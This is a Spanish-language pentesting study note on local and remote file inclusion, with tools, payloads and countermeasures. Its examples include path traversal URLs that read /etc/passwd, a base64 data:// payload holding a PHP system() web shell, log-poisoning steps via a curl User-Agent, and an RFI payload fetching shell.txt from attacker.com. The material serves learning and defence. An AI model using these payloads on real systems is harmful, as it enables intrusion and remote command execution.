---
title: "Análisis de Vulnerabilidades: LFI y RFI"
slug: analisis-lfi-rfi
aliases: [LFI, RFI, Local File Inclusion, Remote File Inclusion, Path Traversal, Directory Traversal]
fase: [Análisis de Vulnerabilidades]
plataforma: Web
dificultad: Intermedia
mitre: [T1190]
related: [fuzzing-lfi-ssrf, analisis-ssrf]
learning_refs: [portswigger/file-path-traversal-simple-case, portswigger/file-path-traversal-absolute-path-bypass]
---

# Análisis de Vulnerabilidades: LFI y RFI

## Descripción
La inclusión de archivos (File Inclusion) permite a un atacante incluir archivos locales (LFI) o remotos (RFI) en el contexto de ejecución de la aplicación. Según *The Web Application Hacker's Handbook*, estas fallas suelen ser precursores directos de la Ejecución Remota de Comandos (RCE). El LFI ocurre cuando la entrada del usuario se usa para construir rutas de archivos; el RFI, cuando la aplicación permite incluir scripts desde servidores externos.

## Herramientas
- **Burp Suite (Intruder)** — Fuzzing de rutas sistemático con SecLists.
- **FFUF** — Identificación rápida de parámetros vulnerables.
- **fimap** — Herramienta especializada en la detección y explotación de File Inclusion.

## Comandos / Ejemplos

### 1. LFI Básico y Path Traversal
Lectura de archivos sensibles del sistema:
```bash
# Linux
http://target.com/view?page=../../../../etc/passwd
# Windows
http://target.com/view?page=../../../../windows/system32/drivers/etc/hosts
```

### 2. Uso de PHP Wrappers (Técnicas Avanzadas)
Cuando el código de la página se procesa pero no se muestra, se puede usar `base64` para leerlo:
- **Lectura de código fuente (PHP)**: `php://filter/convert.base64-encode/resource=config.php`
- **Inyección de código (Data wrapper)**: `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id` (Requiere `allow_url_include=On`).

### 3. Log Poisoning (De LFI a RCE)
Si el atacante puede leer los logs del servidor (ej. Apache `/var/log/apache2/access.log`), puede inyectar código PHP en el `User-Agent` de una petición previa:
1. **Inyección**: `curl -A "<?php system($_GET['cmd']); ?>" http://target.com/`
2. **Explotación**: `http://target.com/view?page=../../../../var/log/apache2/access.log&cmd=id`

### 4. Remote File Inclusion (RFI)
Ejecución de un script malicioso alojado externamente:
- **Payload**: `http://target.com/view?page=http://attacker.com/shell.txt`
*Nota: Requiere `allow_url_include=On` en php.ini.*

## Contramedidas
- **Deshabilitar Funciones Peligrosas**: Configurar `allow_url_include=Off` y `allow_url_fopen=Off`.
- **Listas Blancas**: Usar solo nombres de archivos permitidos o IDs en lugar de rutas dinámicas.
- **Validación de Rutas**: Normalizar las rutas y verificar que el archivo final esté dentro del directorio base esperado.
- **Principio de Mínimo Privilegio**: El servidor web no debe tener permisos de lectura en `/var/log/` ni archivos críticos del sistema.

## Referencias
- Stuttard, D., & Pinto, M. (2011). *The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws* (2nd ed.). Wiley.
- Rahalkar, S. (2017). *Metasploit Penetration Testing Cookbook* (3rd ed.). Packt Publishing.
- MITRE Corporation. (2024). ATT&CK Technique T1190: Exploit Public-Facing Application. https://attack.mitre.org/techniques/T1190/
